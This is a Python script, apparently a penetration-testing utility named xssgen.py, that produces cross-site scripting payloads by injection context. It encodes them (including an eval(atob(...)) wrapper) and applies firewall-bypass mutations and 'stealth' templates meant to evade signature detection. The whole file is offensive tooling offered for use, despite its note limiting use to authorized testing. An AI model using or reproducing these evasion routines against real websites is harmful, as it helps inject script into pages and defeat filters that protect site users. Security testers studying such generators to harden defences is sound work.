#!/usr/bin/env python3
# ============================================================
#   xssgen.py — XSS Payload Generator
#   Author : R0b3rt0
#   Version: 2.0
#   Purpose: Educational XSS payload generation for
#            authorized penetration testing engagements
# ============================================================

import argparse
import sys
import os
import random
import base64
import urllib.parse
from datetime import datetime

# ── ANSI colours ────────────────────────────────────────────
R  = "\033[91m"   # red
G  = "\033[92m"   # green
Y  = "\033[93m"   # yellow
B  = "\033[94m"   # blue
M  = "\033[95m"   # magenta
C  = "\033[96m"   # cyan
W  = "\033[97m"   # white
DIM = "\033[2m"
BOLD = "\033[1m"
RST = "\033[0m"

BANNER = f"""
{R}██╗  ██╗███████╗███████╗ ██████╗ ███████╗███╗   ██╗{RST}
{R}╚██╗██╔╝██╔════╝██╔════╝██╔════╝ ██╔════╝████╗  ██║{RST}
{Y} ╚███╔╝ ███████╗███████╗██║  ███╗█████╗  ██╔██╗ ██║{RST}
{Y} ██╔██╗ ╚════██║╚════██║██║   ██║██╔══╝  ██║╚██╗██║{RST}
{G}██╔╝ ██╗███████║███████║╚██████╔╝███████╗██║ ╚████║{RST}
{G}╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝{RST}

{DIM}  XSS Payload Generator v2.0  ·  by {C}R0b3rt0{RST}{DIM}
  For authorized penetration testing only{RST}
  {DIM}─────────────────────────────────────────{RST}
"""

CONTEXTS = ["html", "attribute", "js", "url", "filter-bypass"]
ENCODINGS = ["none", "base64", "url", "html-entity", "unicode"]


# ── Payload loaders ─────────────────────────────────────────

def load_payloads(file_path: str) -> list[str]:
    if not os.path.isfile(file_path):
        print(f"{R}[-] Payload file not found:{RST} {file_path}")
        sys.exit(1)
    with open(file_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]


def file_map(base_dir: str) -> dict:
    return {
        "html":          os.path.join(base_dir, "html.txt"),
        "attribute":     os.path.join(base_dir, "attribute.txt"),
        "js":            os.path.join(base_dir, "js.txt"),
        "url":           os.path.join(base_dir, "url.txt"),
        "filter-bypass": os.path.join(base_dir, "filter_bypass.txt"),
    }


# ── Encoders ────────────────────────────────────────────────

def encode_payload(payload: str, method: str) -> str:
    if method == "none":
        return payload
    elif method == "base64":
        encoded = base64.b64encode(payload.encode()).decode()
        return f"<script>eval(atob('{encoded}'))</script>"
    elif method == "url":
        return urllib.parse.quote(payload)
    elif method == "html-entity":
        return "".join(f"&#{ord(c)};" for c in payload)
    elif method == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    return payload


# ── Mutators (stealth / WAF bypass) ─────────────────────────

def mutate(payload: str, level: int) -> list[str]:
    """
    Generate WAF-bypass mutations of a payload.
    level 1 = light, level 2 = medium, level 3 = aggressive
    """
    variants = [payload]

    if level >= 1:
        # Case variation
        variants.append(payload.replace("script", "ScRiPt").replace("alert", "aLeRt"))
        # Double URL encode
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))

    if level >= 2:
        # Null byte injection
        variants.append(payload.replace("<", "<%00"))
        # HTML comment break
        variants.append(payload.replace("script", "scr<!---->ipt"))
        # Tab/newline in tag
        variants.append(payload.replace(" ", "\t"))

    if level >= 3:
        # SVG with CDATA
        variants.append(f"<svg><script><![CDATA[{payload}]]></script></svg>")
        # Template literal bypass
        inner = payload.replace("alert(1)", r"ale\u{72}t`1`")
        variants.append(inner)
        # Concatenation split
        variants.append(payload.replace("alert", "ale'+'rt").replace("ale'+'rt(1)", "window['ale'+'rt'](1)"))

    return variants


# ── Output helpers ──────────────────────────────────────────

def print_payloads(payloads: list[str], encoding: str, mutate_level: int,
                   show_index: bool = True, output_file: str = None):
    lines = []
    idx = 1

    for raw in payloads:
        encoded = encode_payload(raw, encoding)

        if mutate_level > 0:
            variants = mutate(encoded, mutate_level)
        else:
            variants = [encoded]

        for v in variants:
            prefix = f"{DIM}{idx:>3}.{RST} " if show_index else "     "
            line = f"{prefix}{G}{v}{RST}"
            print(line)
            lines.append(v)
            idx += 1

    if output_file:
        with open(output_file, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        print(f"\n{C}[+] Saved {len(lines)} payloads →{RST} {output_file}")

    return lines


# ── Stealth mode: randomise + pad ───────────────────────────

def stealth_wrap(payload: str) -> str:
    """Wrap payload to evade length-based and signature detections."""
    junk = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(4, 10)))
    templates = [
        f'<input type="{junk}" value="" {payload}>',
        f'<details open ontoggle={payload.replace("<","").replace(">","").strip()}>',
        f'<!--{junk}-->{payload}<!--{junk}-->',
        f'<{junk} style="display:none">{payload}</{junk}>',
    ]
    return random.choice(templates)


# ── Main ────────────────────────────────────────────────────

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description=f"{BOLD}XSS Payload Generator{RST} — R0b3rt0",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"""
{Y}Examples:{RST}
  {G}python xssgen.py --context html{RST}
  {G}python xssgen.py --context js --encode base64{RST}
  {G}python xssgen.py --context filter-bypass --mutate 3{RST}
  {G}python xssgen.py --context attribute --stealth --out results.txt{RST}
  {G}python xssgen.py --context html --random 5{RST}

{Y}Contexts:{RST}  html | attribute | js | url | filter-bypass
{Y}Encodings:{RST} none | base64 | url | html-entity | unicode
        """
    )

    parser.add_argument("--context",  required=True, choices=CONTEXTS,
                        help="Injection context")
    parser.add_argument("--encode",   default="none", choices=ENCODINGS,
                        help="Encoding method (default: none)")
    parser.add_argument("--mutate",   type=int, default=0, choices=[0, 1, 2, 3],
                        help="WAF-bypass mutation level 0-3 (default: 0)")
    parser.add_argument("--stealth",  action="store_true",
                        help="Wrap payloads in stealth HTML templates")
    parser.add_argument("--random",   type=int, metavar="N",
                        help="Pick N random payloads instead of all")
    parser.add_argument("--out",      metavar="FILE",
                        help="Save payloads to file")
    parser.add_argument("--payload-dir", default="payloads",
                        help="Path to payloads directory (default: payloads/)")
    parser.add_argument("--list",     action="store_true",
                        help="List available contexts and exit")

    args = parser.parse_args()

    if args.list:
        print(f"{Y}Available contexts:{RST}")
        for c in CONTEXTS:
            print(f"  {G}·{RST} {c}")
        print(f"\n{Y}Available encodings:{RST}")
        for e in ENCODINGS:
            print(f"  {G}·{RST} {e}")
        sys.exit(0)

    fmap = file_map(args.payload_dir)
    payloads = load_payloads(fmap[args.context])

    # ── Random subset
    if args.random:
        payloads = random.sample(payloads, min(args.random, len(payloads)))

    # ── Stealth wrap
    if args.stealth:
        payloads = [stealth_wrap(p) for p in payloads]

    # ── Header
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{DIM}  Context  : {RST}{C}{args.context}{RST}")
    print(f"{DIM}  Encoding : {RST}{C}{args.encode}{RST}")
    print(f"{DIM}  Mutate   : {RST}{C}level {args.mutate}{RST}")
    print(f"{DIM}  Stealth  : {RST}{C}{args.stealth}{RST}")
    print(f"{DIM}  Time     : {RST}{C}{ts}{RST}")
    print(f"\n{Y}{'─'*50}{RST}\n")

    # ── Output
    print_payloads(payloads, args.encode, args.mutate, output_file=args.out)

    print(f"\n{Y}{'─'*50}{RST}")
    print(f"{DIM}  Use only on systems you own or have written{RST}")
    print(f"{DIM}  authorization to test. — R0b3rt0{RST}\n")


if __name__ == "__main__":
    main()
